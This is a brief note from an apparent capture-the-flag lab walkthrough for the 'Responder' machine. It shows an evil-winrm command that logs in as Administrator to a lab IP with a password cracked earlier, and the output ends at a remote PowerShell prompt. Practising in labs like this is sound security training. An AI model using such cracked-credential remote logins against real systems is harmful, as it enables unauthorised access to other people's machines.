wsman[[Responder/02 - Enumeration|02 - Enumeration]] is running on the machine. It may be possible to user WinRM using the recovered credentials[[04 - John the RIpper]].

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.129.81.78 -u Administrator -p badminton 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
